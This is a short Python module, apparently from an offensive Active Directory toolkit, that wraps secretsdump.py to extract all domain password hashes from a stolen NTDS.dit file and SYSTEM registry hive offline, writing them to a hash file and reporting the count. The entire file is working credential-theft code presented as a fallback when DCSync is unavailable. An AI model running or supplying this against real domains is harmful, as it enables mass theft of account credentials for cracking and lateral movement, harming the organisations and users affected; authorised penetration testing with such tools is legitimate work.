"""
Offline NTDS.dit Extraction — Parse credentials from a stolen
NTDS.dit database file when DCSync is not available.

Requires: NTDS.dit + SYSTEM registry hive (for the decryption key).
"""

import os
import subprocess
from pathlib import Path


class OfflineExtractor:
    """Extract credentials from offline NTDS.dit + SYSTEM hive."""

    def __init__(self, output_dir: Path):
        self.output_dir = output_dir

    def extract(
        self, ntds_path: str, system_path: str, security_path: str = ""
    ) -> str:
        """
        Parse NTDS.dit offline via secretsdump.py LOCAL mode.

        Returns path to the .ntds hash file on success, empty string on failure.
        """
        print(f"\n{'=' * 60}")
        print("NTDS.DIT OFFLINE EXTRACTION")
        print(f"{'=' * 60}")
        print(f"[*] NTDS.dit: {ntds_path}")
        print(f"[*] SYSTEM:   {system_path}")

        output_prefix = str(self.output_dir / "offline_ntds")

        cmd = [
            "secretsdump.py",
            "-ntds", ntds_path,
            "-system", system_path,
            "-outputfile", output_prefix,
        ]

        if security_path:
            cmd += ["-security", security_path]

        cmd.append("LOCAL")

        try:
            print("[*] Parsing offline NTDS.dit...")
            subprocess.run(cmd, capture_output=True, text=True, timeout=600)

            ntds_file = f"{output_prefix}.ntds"
            if os.path.exists(ntds_file):
                with open(ntds_file) as f:
                    hash_count = sum(1 for l in f if ":::" in l)
                print(f"[+] Extracted {hash_count} hashes from offline NTDS.dit")
                print(f"[+] Output: {ntds_file}")
                return ntds_file

            print("[-] Extraction failed")
            return ""

        except Exception as e:
            print(f"[-] Error: {e}")
            return ""